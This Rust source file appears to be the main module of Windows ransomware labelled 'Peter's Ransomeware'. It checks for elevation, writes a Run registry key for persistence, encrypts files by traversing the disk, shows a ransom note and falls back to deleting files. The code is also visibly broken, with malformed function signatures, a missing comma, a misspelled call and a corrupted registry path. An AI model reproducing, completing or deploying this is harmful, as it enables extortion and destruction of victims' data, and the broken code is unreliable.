#[cfg(windows)]
extern crate winapi;

mod encryption;
mod lib;
mod traversing;
use lib::anti_reversing;
use std::ffi::CString;
use std::ptr::null_mut;
use std::str;
use traversing::{traverse_and_delete, traverse_and_encrypt};
use winapi::shared::minwindef::HKEY;
use winapi::um::fileapi::{CreateFileA, ReadFile, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::libloaderapi::GetModuleFileNameA;
use winapi::um::processthreadsapi::{
    CreateProcessA, GetCurrentProcess, OpenProcessToken, PROCESS_INFORMATION, STARTUPINFOA,
};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::shellapi::ShellExecuteA;
use winapi::um::winbase::{GetUserNameA, STARTF_USESHOWWINDOW};
use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
use winapi::um::winnt::{FILE_ATTRIBUTE_NORMAL, FILE_READ_DATA, FILE_SHARE_READ};
use winapi::um::winnt::{HANDLE, KEY_ALL_ACCESS, REG_SZ};
use winapi::um::winreg::{
    RegCloseKey, RegGetValueA, RegOpenKeyExA, RegSetValueExA, HKEY_LOCAL_MACHINE,
};

fn main() {
    if !already_encrypt(){
        println!("Eleavated!! Yay");
    } else {
        println!("Not elevated requesting UAC");
        std::process::exit(0);
    } 
    if add_registry() == false{
        println!("");
    } else {
        println!("");
    }

    traverse_and_encrypty();

    if display_ransom_note() == false {
        traverse_and_delete();
    }
}

fn add_registry -> bool{
    unsafe{
        let mut registry_handle: HKEY= null_mut();
        if RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            CString::new("Software\\Microsoft\\Windows||CurrentVersion||Run")
                .unwrap()
                .as_ptr(),
            0,
            KEY_ALL_ACCESS,
            &mut registry_handle,
        ) != 0 
        {
            println!("");
            RegCloseKey(registry_handle);
            return false;
        }

        let mut reg_type: u32= 0;
        let mut path: Vec<u8>= Vec::new();
        let mut size: u32= 200;

        let VEC_SIZE= 200;
        path.resize(VEC_SIZE, 0u8);
       
        if RegGetValueA(
            HKEY_LOCAL_MACHINE,
            CString::new("Software\\Microsoft\\Windows||CurrentVersion||Run")
                .unwrap()
                .as_ptr(),
            CString::new("Peter's Ransomeware").unwrap().as_ptr()
            2,
            &mut reg_type,
            path.as_ptr() as *const _ as *mut _,
            &mut size,
        ) != 0
        {

        }
    }
}
